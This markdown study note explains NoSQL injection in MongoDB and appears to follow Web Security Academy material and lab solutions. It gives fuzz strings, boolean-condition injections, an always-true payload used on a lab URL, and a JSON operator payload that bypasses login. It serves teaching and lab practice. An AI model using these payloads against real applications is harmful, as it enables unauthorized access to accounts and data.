## NoSQL injection

NoSQL injection is a vulnerability where an attacker is able to interfere with the queries that an application makes to a NoSQL database


### Types of NoSQL injection 
1. Syntax injection   
        Break the NoSQL query syntax, enabling you to inject your own payload
2. Operator injection  
        You can use NoSQL query operators to manipulate queries


###  NoSQL syntax injection  
NoSQL injection can be detected by attempting to break query syntax. For a systemtic approach test each input by submitting fuzz string and special character which may trigger database error.

### Detecting syntax injection in MongoDB
Let's say an application display product based on categorizes

```
https://insecure-website.com/product/lookup?category=fizzy
```

This cause the application to send a JSON query to retrive relevent product 

```
this.category == 'fizzy'
```

To test whether the input may be vulnerable, submit a fuzz string in the value of the category parameter.

```
'"`{
;$Foo}
$Foo \xYZ
```

Use the string to construct a attack 

```
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```


 After detecting a vulnerability, the next step is to determine whether you can influence boolean conditions using NoSQL syntax.

To test this, send two requests, one with a false condition and one with a true condition. For example you could use the conditional statements ' && 0 && 'x and ' && 1 && 'x as follows


```
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
```
```
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```
As it has been identified that you can influence boolean conditions, you can attempt to override existing conditions to exploit the vulnerability


For example, you can inject a JavaScript condition that always evaluates to true, such as `'||'1'=='1`


```
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
```

MongoDB will interperet as

```
this.category == 'fizzy'||'1'=='1'
```


## NoSQL operator injection


Examples of MongoDB query operators include:


* `$where` - Matches documents that satisfy a JavaScript expression.
* `$ne` - Matches all values that are not equal to a specified value.
* `$in` - Matches all of the values specified in an array.
* `$regex` - Selects documents where values match a specified regular expression.

You may be able to inject query operators to manipulate NoSQL queries. To do this, systematically submit different operators into a range of user inputs, then review the responses for error messages or other changes.  
For URL-based inputs, you can insert query operators via URL parameters. For example, `username=wiener` becomes `username[$ne]=invalid`. If this doesn't work, you can try the following:

1. Convert the request method from `GET` to `POST`.
2. Change the Content-Type header to `application/json`.
3. Add JSON to the message body.
4. Inject query operators in the JSON.



# LAB 


## Lab: Detecting NoSQL injection


```
https://0aa3009103cd8b2481eb7f22009e00c7.web-security-academy.net/filter?category=Gifts%27%7c%7c%27%31%27%3d%3d%27%31
```



## Lab: Exploiting NoSQL operator injection to bypass authentication

```json
{
  "username": {
    "$regex": "admin.*"
  },
  "password": {
    "$ne": ""
  }
}
```



## Lab: Exploiting NoSQL operator injection to extract unknown fields

